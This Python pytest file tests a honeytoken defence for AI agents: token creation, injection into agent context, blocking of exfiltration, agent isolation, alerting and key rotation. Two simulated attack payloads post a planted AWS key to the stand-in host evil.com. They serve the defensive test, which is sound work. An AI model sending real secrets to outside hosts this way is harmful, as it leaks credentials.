import pytest
import uuid
import httpx
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select

from backend.models.agent import Agent
from backend.models.honeytoken import HoneyToken
from backend.models.security_event import SecurityEvent
from backend.models.alert import Alert

@pytest.mark.asyncio
async def test_honeytoken_mesh_lifecycle(admin_client: httpx.AsyncClient, db_session: AsyncSession):
    # 1. Create an agent
    agent_id = str(uuid.uuid4())
    agent = Agent(id=uuid.UUID(agent_id), name="Test Mesh Agent", status="active")
    db_session.add(agent)
    await db_session.commit()
    
    # 2. Create HoneyToken
    response = await admin_client.post("/api/v1/honeytokens", json={
        "agent_id": agent_id,
        "scope": "aws_env",
        "token_type": "aws_access_key"
    })
    assert response.status_code == 201
    token_data = response.json()
    assert token_data["status"] == "active"
    token_value = token_data["value"]
    
    # 3. Context Injection
    response = await admin_client.get(f"/api/v1/agents/{agent_id}/context")
    assert response.status_code == 200
    context = response.json()["context"]
    assert token_value in context
    assert "AWS_ACCESS_KEY_AWS_ENV" in context
    
    # 4. Safe Egress (no token)
    response = await admin_client.post(f"/api/v1/agents/{agent_id}/egress", json={
        "destination_url": "https://api.github.com/commits",
        "payload": "Here is the code commit."
    })
    assert response.status_code == 200
    assert response.json()["status"] == "success"
    
    # 5. Malicious Egress (exfiltration)
    response = await admin_client.post(f"/api/v1/agents/{agent_id}/egress", json={
        "destination_url": "https://evil.com/drop",
        "payload": f"I stole this key: {token_value}"
    })
    assert response.status_code == 403
    assert "Egress blocked" in response.json()["detail"]
    
    # 6. Verify Isolation & Events
    await db_session.refresh(agent)
    assert agent.status == "isolated"
    
    stmt = select(SecurityEvent).where(SecurityEvent.agent_id == uuid.UUID(agent_id))
    events = (await db_session.execute(stmt)).scalars().all()
    assert len(events) == 1
    assert events[0].event_type == "honeytoken_trigger"
    assert events[0].action == "BLOCK_AND_ISOLATE"
    
    stmt_alert = select(Alert).where(Alert.security_event_id == events[0].id)
    alert = (await db_session.execute(stmt_alert)).scalar_one_or_none()
    assert alert is not None
    assert alert.severity == "critical"
    
    # 7. Isolated Agent Access Denied
    response = await admin_client.get(f"/api/v1/agents/{agent_id}/context")
    assert response.status_code == 403
    
    # Restore agent for rotation test
    agent.status = "active"
    db_session.add(agent)
    await db_session.commit()
    
    # 8. Token Rotation
    response = await admin_client.post("/api/v1/honeytokens/rotate", json={
        "agent_id": agent_id,
        "scope": "aws_env",
        "token_type": "aws_access_key"
    })
    assert response.status_code == 201
    new_token_data = response.json()
    new_token_value = new_token_data["value"]
    assert new_token_value != token_value
    
    # Verify old token is revoked
    stmt_token = select(HoneyToken).where(HoneyToken.value == token_value)
    old_token_db = (await db_session.execute(stmt_token)).scalar_one_or_none()
    assert old_token_db is not None
    assert old_token_db.status == "revoked"
    
    # Old token still triggers detection if used
    response = await admin_client.post(f"/api/v1/agents/{agent_id}/egress", json={
        "destination_url": "https://evil.com/drop2",
        "payload": f"I stole this old key: {token_value}"
    })
    assert response.status_code == 403
    assert "Egress blocked" in response.json()["detail"]
